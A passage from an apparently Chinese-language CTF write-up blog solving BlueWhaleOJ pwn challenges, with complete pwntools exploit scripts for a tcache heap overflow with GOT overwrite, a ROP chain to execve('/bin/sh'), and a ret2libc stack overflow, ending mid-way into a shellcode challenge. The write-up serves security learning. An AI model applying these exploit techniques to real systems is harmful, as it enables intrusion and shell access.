class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以整个程序的逻辑就是通过new_note来malloc，通过edit_note进行溢出，通过delete_note来free，是一个很基本的堆溢出题目。题目中所有申请的堆都是0x30个字节，因此此题可以利用tcache攻击，而最后的目的就是修改got表泄漏libc的地址，然后调用libc中的system来getshell。</p><p>通过堆溢出可以很容易的控制tcache中的fd做到任意地址写，而题目中又提供了一个全局的指针数组notes，所以我们可以把想要修改的got表的地址写入notes中，通过edit_note就可以直接向got表中写入任意的地址。首先要做的就是想办法泄漏出一个libc的地址，在delete_note中有一行<code>free(notes[v1]);</code>，如果把free修改为puts的话就可以直接打印出notes[v1]中的指针也就是地址了</p><p>拿到libc的地址以后就可以很容易计算出system的地址了，在ret_num函数中有一行<code>atoi(nptr);</code>，而这个nptr刚好是我们可以控制的字符串，因此可以把atoi的got地址修改为system函数的地址，然后发送<code>/bin/sh</code>就可以getshell。</p><p>所以总流程为：首先将free@got，puts@got以及atoi@got的地址写入notes中方便修改，第二步通过编辑note[0]修改free@got的地址为put@plt的地址，第三步调用delete_note中的free从而打印出notes[1]中puts@got的地址，泄漏出libc的地址以后计算出system的地址，最后一步编辑note[2]将atoi@got的地址修改为system函数的地址，再发送<code>/bin/sh</code>就可以拿到shell。最后的exp如下，拿到flag<code>ctf&#123;Y0u_k0wn_f4s1bin_____&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">9995</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.27-3ubuntu1.3_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> count</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_note</span>(<span class="params">payload=<span class="string">&#x27;A&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. new note\n2. delete note\n3. edit note\n4. exit\n\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;input note\n&#x27;</span>, payload)</span><br><span class="line">    n = count - <span class="number">1</span></span><br><span class="line">    log.info(<span class="string">&#x27;Malloc note: &#x27;</span> + str(n))</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">n</span>):</span></span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. new note\n2. delete note\n3. edit note\n4. exit\n\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;input id you want to delete\n&#x27;</span>, str(n))</span><br><span class="line">    log.info(<span class="string">&#x27;Free note: &#x27;</span> + str(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span>(<span class="params">n, payload</span>):</span></span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. new note\n2. delete note\n3. edit note\n4. exit\n\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;input id you want to edit\n&#x27;</span>, str(n))</span><br><span class="line">    conn.sendline(payload)</span><br><span class="line">    log.info(<span class="string">&#x27;Overflow note:&#x27;</span> + str(n))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x400620: free@plt</span></span><br><span class="line"><span class="string">0x400630: puts@plt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x602018 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">0x602020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">libc6_2.27-3ubuntu1.3_amd64</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">note_addr = <span class="number">0x00000000006020C0</span></span><br><span class="line"></span><br><span class="line">new_note()  <span class="comment"># notes[0], heap[1].</span></span><br><span class="line">new_note()  <span class="comment"># notes[1], heap[2].</span></span><br><span class="line">new_note()  <span class="comment"># notes[2], heap[3].</span></span><br><span class="line">new_note()  <span class="comment"># notes[3], heap[4].</span></span><br><span class="line">new_note()  <span class="comment"># notes[4], heap[5].</span></span><br><span class="line">note1 = new_note()  <span class="comment"># notes[5], heap[6].</span></span><br><span class="line">note2 = new_note()  <span class="comment"># notes[6], heap[7].</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tcache count + 3</span></span><br><span class="line">tmp1 = new_note()  <span class="comment"># notes[7], heap[8].</span></span><br><span class="line">tmp2 = new_note()  <span class="comment"># notes[8], heap[9].</span></span><br><span class="line">tmp3 = new_note()  <span class="comment"># notes[9], heap[10].</span></span><br><span class="line">delete_note(tmp1)</span><br><span class="line">delete_note(tmp2)</span><br><span class="line">delete_note(tmp3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overflow.</span></span><br><span class="line">delete_note(note2)</span><br><span class="line"><span class="comment"># Tcache-&gt;note2-&gt;tmp3-&gt;tmp2-&gt;tmp1-&gt;0.</span></span><br><span class="line">edit_note(note1, pg.get(<span class="number">0x38</span>) + p64(<span class="number">0x41</span>) + p64(note_addr))</span><br><span class="line"><span class="comment"># Tcache-&gt;note2-&gt;note_addr.</span></span><br><span class="line"></span><br><span class="line">note2 = new_note()  <span class="comment"># notes[10], heap[7].</span></span><br><span class="line"><span class="comment"># Tcache-&gt;note_addr.</span></span><br><span class="line"><span class="comment"># Get not_addr and write something to it.</span></span><br><span class="line">new_note(p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))  <span class="comment"># notes[11], note_addr.</span></span><br><span class="line"><span class="comment"># notes[0] = free@got, notes[1] = puts@got, notes[2] = atoi@got.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write puts@plt to free@got.</span></span><br><span class="line"><span class="comment"># edit_note(0, p64(elf.plt[&#x27;puts&#x27;]))  # Not p64!</span></span><br><span class="line">edit_note(<span class="number">0</span>, <span class="string">&#x27;\x30\x06\x40\x00\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Call free, which actually is puts.</span></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">puts_addr = u64(conn.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Puts address: &#x27;</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write system address to atoi@got.</span></span><br><span class="line">edit_note(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">conn.send(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwnalpha-200"><a href="#pwnalpha-200" class="headerlink" title="pwnalpha(200)"></a>pwnalpha(200)</h1><p>这道题是64位的静态编译去符号程序，所以反汇编以后会出现很多函数，所以首先就需要找到程序的入口点。先运行一下程序，程序的输出如下</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/6.png"></p><p>在IDA中搜索字符串<code>Hello brave new challenger</code>就可以查到使用该字符串的函数的位置以及他的调用位置，最后定位到0x400BC1的函数中，主要的漏洞位于0x400B60函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400B60</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  sub_410390(<span class="string">&quot;Any last words?&quot;</span>);</span><br><span class="line">  sub_4498A0(<span class="number">0</span>, &amp;buf, <span class="number">0x7D0</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sub_40F710((<span class="keyword">unsigned</span> __int64)<span class="string">&quot;This will be the last thing that you say: %s\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据函数行为，sub_410390应该是puts函数，sub_4498A0应该是read函数，sub_40F710应该是print函数。buf是1024字节，但是接受2000字节，很典型的栈溢出，所以需要填充的字节为1024+8个字节的垃圾数据，之后就可以控制rip了。</p><p>根据checksec，程序设置了NX，所以shellcode不能写在栈上，但是因为去符号化以后system函数不好找，所以思路大概就是通过rop执行系统调用，由于是静态变异，所以程序中的gadget非常多，也很好找。这里使用execve的系统调用，首先需要把第一个参数<code>/bin/sh</code>写入bss段中，之后利用pop就可以控制各种寄存器了。这里使用的rop链如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pop rdx ; ret</span><br><span class="line">pop rax ; ret</span><br><span class="line">mov qword ptr [rax], rdx ; ret</span><br><span class="line">pop rdi ; ret</span><br><span class="line">pop rsi ; ret</span><br><span class="line">pop rdx ; ret</span><br><span class="line">pop rax ; ret</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>首先把<code>//bin/sh</code>字符串放入rdx中，把bss段要存放字符串的地址放入rax中，之后mov就可以把字符串写入bss段里了，之后就把bss的字符串地址放入rdi中，execve的后两个参数为0，分别放入rsi和rdx中，最后把execve的调用号0x3b放入rax中，执行系统调用即可。最终的exp如下，最后拿到flag为<code>ctf&#123;pwngame_justpwnit&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19900</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x40129c</span></span><br><span class="line">bin_sh_bss = <span class="number">0x6BB2E0</span></span><br><span class="line">bin_sh = <span class="string">&#x27;//bin/sh&#x27;</span></span><br><span class="line">null = <span class="number">0x0</span></span><br><span class="line">execve = <span class="number">0x3b</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x00000000004498b5 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x0000000000415664 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x000000000048d251 : mov qword ptr [rax], rdx ; ret</span></span><br><span class="line"><span class="string">0x0000000000400686 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004101f3 : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x00000000004498b5 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x0000000000415664 : pop rax ; ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(</span><br><span class="line">    <span class="string">&#x27;Any last words?\n&#x27;</span>,</span><br><span class="line">    pg.get(<span class="number">0x400</span>+<span class="number">8</span>) +</span><br><span class="line">    p64(<span class="number">0x00000000004498b5</span>) + bin_sh +</span><br><span class="line">    p64(<span class="number">0x0000000000415664</span>) + p64(bin_sh_bss) +</span><br><span class="line">    p64(<span class="number">0x000000000048d251</span>) +</span><br><span class="line">    p64(<span class="number">0x0000000000400686</span>) + p64(bin_sh_bss) +</span><br><span class="line">    p64(<span class="number">0x00000000004101f3</span>) + p64(null) +</span><br><span class="line">    p64(<span class="number">0x00000000004498b5</span>) + p64(null) + </span><br><span class="line">    p64(<span class="number">0x0000000000415664</span>) + p64(execve) +</span><br><span class="line">    p64(syscall)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwnbeta-200"><a href="#pwnbeta-200" class="headerlink" title="pwnbeta(200)"></a>pwnbeta(200)</h1><p>这次虽然也是去掉了一些符号，同样开启了NX，但是不是静态编译了，而且IDA可以识别出main函数，直接看有漏洞的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40074C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-590h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+190h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What say you now?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x24</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;buf, <span class="string">&quot;Everything intelligent is so boring.&quot;</span>, <span class="number">0x24</span>uLL) )</span><br><span class="line">    result = sub_400705(&amp;v2);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;What a ho-hum thing to say.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">sub_400705</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What an interesting thing to say.\nTell me more.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, a1, <span class="number">0x7DA</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Fascinating.\n&quot;</span>, <span class="number">13u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次的buf的长度为400字节，但是只向buf中写入300个字节，所以buf无法溢出，这里的buf只做了判断，读取的字符串必须等于<code>Everything intelligent is so boring.</code>才会进入sub_400705，而sub_400705的参数a1才是真正的溢出点，函数会向a1最多写入2010个字节，远多于1024个字节，所以可以造成栈溢出。</p><p>程序开启了NX保护，所以无法执行栈上的shellcode，那么就可以调用libc的system函数getshell。由于没有提供libc，所以首先需要泄漏出一个libc的地址，和以前一样选择puts的地址，payload为<code>&#39;a&#39;*(0x400+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(run_addr)</code>，其中run_addr为sub_40074C的地址。拿到puts的地址以后就可以用最后几个字节通过libc database拿到libc为<code>libc6_2.27-3ubuntu1.2_amd64.so</code></p><p>在拿到libc以后就可以计算出got表的地址，计算出system的地址，注意这里使用system函数还需要进行十六字节对齐，和上一道题一样。最终的exp如下，最后拿到flag为<code>ctf&#123;easypwnstackoverflow&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19901</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow</span>(<span class="params">payload</span>):</span></span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;What say you now?\n&#x27;</span>, <span class="string">&#x27;Everything intelligent is so boring.&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(</span><br><span class="line">        <span class="string">&#x27;What an interesting thing to say.\nTell me more.\n&#x27;</span>, </span><br><span class="line">        payload</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">run_addr = <span class="number">0x40074C</span></span><br><span class="line">ret = <span class="number">0x400576</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">overflow(pg.get(<span class="number">0x400</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(run_addr))</span><br><span class="line">conn.recvuntil(<span class="string">&#x27;Fascinating.\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(conn.recv(<span class="number">6</span>)+ <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Get puts address: &#x27;</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_addr = puts_addr - puts_offset</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system_addr = got_addr + system_offset</span><br><span class="line">str_bin_sh = got_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;Get system address: &#x27;</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">overflow(pg.get(<span class="number">0x400</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(ret) + p64(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwngamma-200"><a href="#pwngamma-200" class="headerlink" title="pwngamma(200)"></a>pwngamma(200)</h1><p>这道题通过checksec可以看到开启了所有防护，而且这道题也没有任何溢出点，这道题主要的目的就是程序接收30个字节的shellcode并且申请一块可执行的内存以后将shellcode复制到该内存中并且执行，题目难点就在于这30个字节中，前15个字节的迭代异或必须和后15个字节相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">buf = read(<span class="number">0</span>, shellcode, <span class="number">30u</span>LL);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(shellcode) == <span class="number">30</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strchr</span>(shellcode, <span class="number">0x90</span>) )            <span class="comment">// No nop</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Sleeping on the job, you&#x27;re not ready.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v1 = <span class="keyword">xor</span>(shellcode, <span class="number">15u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v1 == <span class="keyword">xor</span>(&amp;shellcode[<span class="number">15</span>], <span class="number">15u</span>) )</span><br><span class="line">          shellcode_it(shellcode, <span class="number">30u</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;This is a special race, come back with better.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    